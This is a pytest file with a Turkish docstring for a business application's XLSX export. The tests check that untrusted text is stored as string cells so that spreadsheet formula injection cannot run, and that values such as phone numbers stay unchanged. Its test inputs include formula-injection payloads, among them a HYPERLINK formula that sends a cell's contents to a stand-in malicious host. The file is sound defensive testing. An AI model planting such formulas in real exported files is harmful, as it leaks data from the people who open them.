"""Excel dışa aktarımı: formül YAZILMAZ, değer de BOZULMAZ.

Dışa aktarılan metinlerin bir kısmı dışarıdan geliyor: takip platformundan
gelen hesap ve cihaz adları, ekibin girdiği notlar, müşteri unvanları. Dosyayı
muhasebe açıyor. `=` ile başlayan bir metin formül hücresine yazılırsa
`=HYPERLINK(...)` ya da bir DDE çağrısı o makinede çalışır.

**Eski çözüm değeri bozuyordu.** Metnin başına tek tırnak ekleniyor ve
"Excel tırnağı göstermez" varsayılıyordu; XLSX'te bu DOĞRU DEĞİL — tırnak
ancak hücrenin `quotePrefix` stili varsa gizlenir, düz metne eklendiğinde
metnin parçası olur. Ölçülen sonuç: KVKK veri dökümündeki HER telefon
`'+905321112233` olarak çıkıyordu (ERP tüm numaraları `+90…` biçimine
getirdiği için istisnasız hepsi).

Bugünkü sözleşme: hücre METİN tipine sabitlenir (dosyada `t="inlineStr"`),
değer aynen korunur. Excel metin hücresini zaten değerlendirmez.
"""

from decimal import Decimal
from io import BytesIO

import pytest
from openpyxl import load_workbook

from app.services.export import satirlari_xlsx


def _oku(basliklar: list[str], satirlar: list[list]) -> list[tuple]:
    ham = satirlari_xlsx(basliklar, satirlar, "Deneme")
    return list(load_workbook(BytesIO(ham)).active.iter_rows(min_row=2, values_only=True))


def _hucreler(basliklar: list[str], satirlar: list[list]):
    ham = satirlari_xlsx(basliklar, satirlar, "Deneme")
    return list(load_workbook(BytesIO(ham)).active.iter_rows(min_row=2))


@pytest.mark.parametrize(
    "tehlikeli",
    ['=HYPERLINK("http://kotu/"&A1)', "+1+1", "-VERA", "@SUM(A1)", "\tA1", "\r=1"],
)
def test_formul_hucresi_yazilmaz(tehlikeli: str) -> None:
    ((hucre,),) = _hucreler(["Unvan"], [[tehlikeli]])
    assert hucre.data_type == "s", "metin formül hücresine dönüştü"


@pytest.mark.parametrize(
    "deger",
    ["+905321112233", "-VERA", "@SUM(A1)", '=HYPERLINK("http://kotu/"&A1)', "0532 111 22 33"],
)
def test_deger_aynen_korunur(deger: str) -> None:
    """Kaçış DEĞERİ DEĞİŞTİRMEMELİ; Logo'ya giden telefon numarası bozulmaz."""
    (satir,) = _oku(["Alan"], [[deger]])
    assert satir[0] == deger


def test_normal_metin_ve_sayi_bozulmaz() -> None:
    (satir,) = _oku(
        ["Unvan", "Tutar", "Adet"],
        [["ÇAMKIRAN OTOMOTİV", Decimal("1234.56"), 7]],
    )
    assert satir == ("ÇAMKIRAN OTOMOTİV", 1234.56, 7)


def test_negatif_sayi_kacirilmaz() -> None:
    """Eksi işareti yalnız METİN başındayken tehlikeli; sayı sayı kalmalı."""
    (satir,) = _oku(["Tutar"], [[Decimal("-5.50")]])
    assert satir[0] == -5.5
